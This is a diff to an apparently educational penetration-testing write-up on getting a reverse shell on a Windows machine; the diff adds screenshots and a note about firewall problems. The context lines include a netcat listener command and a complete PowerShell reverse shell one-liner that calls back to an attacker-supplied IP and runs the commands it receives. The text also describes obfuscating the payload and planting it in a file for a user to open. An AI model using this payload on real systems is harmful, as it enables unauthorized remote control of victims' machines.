@@ -34,11 +34,19 @@ With the target identified, the next step is to prepare a listening post to rece
 *   **Netcat:** A functional installation of Netcat on the penetration tester's machine.
 *   **Firewall Configuration:** The tester's firewall must be configured to allow incoming connections on the chosen port.
 
+## when the  firewall isnt configured to accept from that port ; 
+
+![executed it on powershell and didnt work cause of the firewall](https://github.com/user-attachments/assets/2b01a775-f2e4-4dde-bdff-cc3ccf029db7)
+
+
 A Netcat listener is established on port 87, awaiting an incoming connection from the target machine:
 
 ```bash
 nc -lvnp 87
 ```
+
+![listening](https://github.com/user-attachments/assets/d1717877-e1d6-4a91-bed6-984d9faae8fa)
+
 
 ### Phase 3: The Lure - Crafting the Payload
 
@@ -55,6 +63,10 @@ The following PowerShell script is a common example of a reverse shell payload:
 $client = New-Object System.Net.Sockets.TCPClient("<your_ip>",87);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
+![reverse poweshell one-liner](https://github.com/user-attachments/assets/67b74525-7320-498d-a50b-3a07a42bc3be)
+
+
+
 This script is then modified and obfuscated to evade basic detection and embedded within a file that the target user is likely to interact with.
 
 ### Phase 4: Execution - The Trap is Sprung
@@ -64,6 +76,10 @@ The payload is delivered to the target. The user, unsuspecting, executes the fil
 ### Phase 5: Control - A Foothold in the System
 
 The Netcat listener on the penetration tester's machine receives the incoming connection, and a remote shell is established. The tester now has command-line access to the target Windows machine, allowing for further exploration and security assessment within the authorized scope of the engagement.
+
+
+![listed all the content in that dir](https://github.com/user-attachments/assets/0f085294-bd88-4761-bd9d-a461a63cf974)
+
 
 ## Conclusion and Ethical Considerations
 
